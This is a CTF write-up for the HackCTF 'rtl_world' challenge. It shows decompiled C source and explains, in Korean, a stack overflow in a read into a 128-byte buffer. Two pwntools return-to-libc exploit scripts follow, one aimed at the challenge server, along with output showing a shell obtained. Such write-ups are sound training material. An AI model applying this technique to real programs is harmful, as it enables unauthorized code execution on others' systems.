---
layout: post
title: "HackCTF rtl_world"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# rtl_world

## Source

```c
int Get_Money()
{
  int result; // eax
  int v1; // [esp+8h] [ebp-Ch]
  int v2; // [esp+Ch] [ebp-8h]
  int v3; // [esp+10h] [ebp-4h]

  puts("\nThis world is F*cking JabonJui");
  puts("1) Farming...");
  puts("2) Item selling...");
  puts("3) Hunting...");
  v3 = 0;
  v2 = rand();
  printf("(Job)>>> ");
  __isoc99_scanf("%d", &v1);
  result = v1;
  if ( v1 == 2 )
  {
    puts("\nItem selling...");
    while ( v3 <= 350 )
      ++v3;
    puts("+ 350 Gold");
    gold += v3;
    result = printf("\nYour Gold is %d\n", gold);
  }
  else if ( v1 > 2 )
  {
    if ( v1 == 3 )
    {
      puts("\nHunting...");
      while ( v3 <= 500 )
        ++v3;
      puts("+ 500 Gold");
      gold += v3;
      result = printf("\nYour Gold is %d\n", gold);
    }
    else if ( v1 == 4 )
    {
      puts("\nWow! you can find Hidden number!");
      puts("Life is Just a One Shot...");
      puts("Gambling...");
      printf("+ %d Gold\n", v2);
      gold += v2;
      result = printf("\nYour Gold is %d\n", gold);
    }
  }
  else if ( v1 == 1 )
  {
    puts("\nFarming...");
    while ( v3 <= 100 )
      ++v3;
    puts("+ 100 Gold");
    gold += v3;
    result = printf("\nYour Gold is %d\n", gold);
  }
  return result;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+10h] [ebp-90h]
  char buf[128]; // [esp+14h] [ebp-8Ch]
  void *v6; // [esp+94h] [ebp-Ch]
  void *handle; // [esp+98h] [ebp-8h]
  void *s1; // [esp+9Ch] [ebp-4h]

  setvbuf(stdout, 0, 2, 0);
  handle = dlopen("/lib/i386-linux-gnu/libc.so.6", 1);
  v6 = dlsym(handle, "system");
  dlclose(handle);
  for ( s1 = v6; memcmp(s1, "/bin/sh", 8u); s1 = (char *)s1 + 1 )
    ;
  puts("\n\nNPC [Village Presient] : ");
  puts("Binary Boss made our village fall into disuse...");
  puts("If you Have System Armor && Shell Sword.");
  puts("You can kill the Binary Boss...");
  puts("Help me Pwnable Hero... :(\n");
  printf("Your Gold : %d\n", gold);
  while ( 1 )
  {
    Menu();
    printf(">>> ");
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 0:
        continue;
      case 1:
        system("clear");
        puts("[Binary Boss]\n");
        puts("Arch:     i386-32-little");
        puts("RELRO:    Partial RELRO");
        puts("Stack:    No canary found");
        puts("NX:       NX enabled");
        puts("PIE:      No PIE (0x8048000)");
        puts("ASLR:  Enable");
        printf("Binary Boss live in %p\n", handle);
        puts("Binart Boss HP is 140 + Armor + 4\n");
        break;
      case 2:
        Get_Money(gold);
        break;
      case 3:
        if ( gold <= 1999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 1999;
          printf("System Armor : %p\n", v6);
        }
        break;
      case 4:
        if ( gold <= 2999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 2999;
          printf("Shell Sword : %p\n", s1);
        }
        break;
      case 5:
        printf("[Attack] > ");
        read(0, buf, 0x400u);
        return 0;
      case 6:
        puts("Your Not Hero... Bye...");
        exit(0);
        return result;
    }
  }
}
```

## Solve

문제가 복잡하게보이게 만들어져 있지만 i386이기에 ret에 페이로드를 넣으면 끝이다.

마침 5번의 read함수에서 buf[128]보다 크게 1024만큼 입력을 받는다. 이 부분을 이용해 페이로드를 작성하면 된다.

```c
from pwn import *

p = process("./rtl_world")
e = ELF("./rtl_world")

system = e.symbols['system']
binsh = e.search('/bin/sh').next()
payload = ''
payload += "A"*144
payload += p32(system)
payload += "AAAA"
payload += p32(binsh)

print p.recvuntil(">>> ")
p.sendline("5")
print p.recvuntil("[Attack] > ")
p.sendline(payload)
p.interactive()
```

```c
➜  pwnable git:(master) python rtl_world.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3010: Done
[*] '/home/ubuntu/CTF/hackctf/pwnable/rtl_world'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

NPC [Village Presient] :
Binary Boss made our village fall into disuse...
If you Have System Armor && Shell Sword.
You can kill the Binary Boss...
Help me Pwnable Hero... :(

Your Gold : 1000
======= Welcome to RTL World =======
1) Information the Binary Boss!
2) Make Money
3) Get the System Armor
4) Get the Shell Sword
5) Kill the Binary Boss!!!
6) Exit
====================================
>>>
[Attack] >
[*] Switching to interactive mode
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```

```bash
+-------+---------+--------+-------------+-------+-------+-------+
| Dummy | pop3ret | read() | read's retn | arg1  | arg2  | arg3  |
+-------+---------+--------+-------------+-------+-------+-------+
```

```python
from pwn import *

#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']

#p = process("./rtl_world")
p = remote('ctf.j0n9hyun.xyz' ,3010)
e = ELF("./rtl_world")
#gdb.attach(p, 'b*0x08048bec')
#pop_ret = 0x8048545

system = 0x80485b0
binsh = 0x8048eb1

print p.recv(1024)
p.sendline(str(5))
print p.recvuntil("[Attack] > ")

payload = ''
payload += "A"*144
payload += p32(system)
payload += "AAAA"
payload += p32(binsh)

p.sendline(payload)
p.interactive()
```